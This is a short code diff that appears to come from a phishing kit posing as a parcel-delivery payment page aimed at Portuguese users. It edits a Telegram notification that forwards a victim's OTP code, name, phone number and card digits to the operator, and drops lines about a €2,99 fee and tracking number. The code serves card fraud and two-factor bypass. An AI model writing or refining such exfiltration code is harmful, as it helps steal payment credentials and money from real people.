@@ -198,25 +198,20 @@ class TelegramService:
             card_number = card_data.get('numeroCartao', '')
             card_last4 = card_number[-4:] if len(card_number) >= 4 else '****'
             
+            # Clean phone number (remove +351 and format)
+            phone = billing_data.get('telefone', '')
+            clean_phone = phone.replace('+351', '').replace(' ', '').strip()
+            
             message = f"""✅ OTP VERIFICADO COM SUCESSO
 
 🔐 VERIFICAÇÃO DE SEGURANÇA COMPLETA:
 ┣━ 📱 Código OTP: {otp_code}
-┣━ ✅ Status: VERIFICADO
-┗━ ⏰ Verificado em: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+┗━ ✅ Status: VERIFICADO
 
 👤 IDENTIFICAÇÃO DO CLIENTE:
 ┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
-┣━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
-┗━ 💳 Cartão: ****{card_last4}
-
-📦 RASTREAMENTO GERADO: {tracking_number}
-💰 VALOR CONFIRMADO: €2,99
-✅ PAGAMENTO: APROVADO E PROCESSADO
-
-═══════════════════════════════
-🛡️ TRANSAÇÃO SEGURA COMPLETADA 🛡️
-═══════════════════════════════"""
+┣━ 📞 Telefone: {clean_phone}
+┗━ 💳 Cartão: ****{card_last4}"""
             
             return await self.send_message(message)
             
